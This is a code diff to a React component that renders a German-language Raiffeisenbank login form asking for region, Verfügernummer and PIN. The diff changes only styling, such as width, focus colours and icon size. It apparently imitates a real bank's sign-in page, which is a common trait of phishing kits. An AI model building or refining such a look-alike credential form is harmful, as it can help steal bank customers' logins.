@@ -48,7 +48,7 @@ const Raiffeisenbank = () => {
       }}
     >
       {/* Login Card */}
-      <div className="relative z-10 w-full max-w-md rounded-lg bg-white p-8 shadow-lg">
+      <div className="relative z-10 w-full max-w-lg rounded-lg bg-white p-8 shadow-lg">
         <h1 className="mb-2 text-2xl font-light text-[#1a1a1a]">
           Bitte melden Sie sich an
         </h1>
@@ -69,15 +69,15 @@ const Raiffeisenbank = () => {
           </label>
           <div
             onClick={() => setSelectOpen(!selectOpen)}
-            className={`w-full cursor-pointer border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none ${
-              selectOpen ? "border-[#fbf315]" : "border-gray-300"
+            className={`w-full cursor-pointer border-b-2 px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none ${
+              selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : "border-gray-300 bg-[#f4f4f4]"
             }`}
           >
             {bundesland || "\u00A0"}
           </div>
           <div className="pointer-events-none absolute right-3 top-4">
             <svg
-              className={`h-4 w-4 text-gray-500 transition-transform duration-200 ${selectOpen ? "rotate-180" : ""}`}
+              className={`h-5 w-5 text-gray-500 transition-transform duration-200 ${selectOpen ? "rotate-180" : ""}`}
               fill="none"
               stroke="currentColor"
               viewBox="0 0 24 24"
@@ -123,7 +123,7 @@ const Raiffeisenbank = () => {
             value={verfueger}
             onChange={(e) => setVerfueger(e.target.value)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315]"
+            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
           />
           <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
             Verfügernummer eingeben <span className="text-gray-400">*</span>
@@ -138,7 +138,7 @@ const Raiffeisenbank = () => {
             value={pin}
             onChange={(e) => setPin(e.target.value)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315]"
+            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
           />
           <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
             PIN eingeben <span className="text-gray-400">*</span>
